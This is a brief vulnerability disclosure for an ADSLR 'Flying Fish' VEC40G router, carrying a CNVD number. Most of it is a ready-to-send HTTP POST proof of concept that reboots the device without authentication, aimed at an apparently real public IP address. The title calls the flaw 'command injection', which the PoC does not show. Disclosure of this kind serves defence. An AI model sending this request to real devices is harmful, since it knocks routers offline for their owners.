Flying Fish has a command injection vulnerability

official website：http://www.adslr.com/

version:VEC40G

CNVD number:CNVD-2021-91411

POC：
```
POST /send_order.cgi?parameter=restart HTTP/1.1
Host: 113.9.163.91:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 20
Origin: http://113.9.163.91:8081/
Connection: close
Referer: http://113.9.163.91:8081/home/index.html
Cookie: 

{"restart":"reboot"}
```
Restart the device without logging in

![WPS图片(1)](https://github.com/shulao2020/cve/assets/135507126/1ba6d8a6-8fc7-4785-bcc3-4f66e112a082)

![WPS图片(2)](https://github.com/shulao2020/cve/assets/135507126/2a0eaa1c-0148-4896-b3f9-57b6ca64228c)

![WPS图片(3)](https://github.com/shulao2020/cve/assets/135507126/761a3f7b-f984-4919-9eb6-2070fc27dadd)
